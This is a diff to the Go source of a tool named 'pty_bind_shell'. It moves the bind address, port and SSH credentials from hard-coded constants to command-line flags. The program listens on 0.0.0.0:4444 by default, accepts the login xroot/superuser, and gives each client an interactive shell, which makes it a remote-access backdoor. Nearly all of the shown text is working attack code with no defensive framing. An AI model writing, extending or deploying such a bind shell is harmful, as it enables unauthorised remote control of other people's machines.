@@ -1,4 +1,4 @@
-package main
+package pty_bind_shell
 
 import (
 	"io"
@@ -7,14 +7,11 @@ import (
 	"strconv"
 	"strings"
 
+	"github.com/akamensky/argparse"
 	"github.com/creack/pty"
+	"github.com/fatih/color"
 	"github.com/gliderlabs/ssh"
 	"golang.org/x/term"
-)
-
-const (
-	PASSWORD = "password"
-	USERNAME = "xroot"
 )
 
 func simpleCommandShellHandler(s ssh.Session) {
@@ -71,7 +68,15 @@ func confirmShellConfig(s ssh.Session) (size pty.Winsize, shell string) {
 }
 
 func main() {
-	ssh.ListenAndServe("HOST:PORT", func(s ssh.Session) {
+	parser := argparse.NewParser("pty_bind_shell", "")
+	var HOST *string = parser.String("H", "host", &argparse.Options{Required: false, Default: "0.0.0.0", Help: "Host to bind or connect to"})
+	var PORT *string = parser.String("P", "port", &argparse.Options{Required: false, Default: "4444", Help: "Port to bind or connect to"})
+	var USERNAME *string = parser.String("u", "username", &argparse.Options{Required: false, Default: "xroot", Help: "SSH username"})
+	var PASSWORD *string = parser.String("p", "password", &argparse.Options{Required: false, Default: "superuser", Help: "SSH password"})
+	err := parser.Parse(os.Args)
+	exit_on_error("[PARSER ERROR]", err)
+
+	ssh.ListenAndServe(*HOST+":"+*PORT, func(s ssh.Session) {
 		if runtime.GOOS == "windows" {
 			io.WriteString(s, "\n[-] Windows dont have tty, using simple command shell.\n")
 			simpleCommandShellHandler(s)
@@ -113,7 +118,7 @@ func main() {
 		}
 	},
 		ssh.PasswordAuth(func(ctx ssh.Context, pass string) bool {
-			return pass == PASSWORD && ctx.User() == USERNAME
+			return pass == *PASSWORD && ctx.User() == *USERNAME
 		}),
 	)
 }
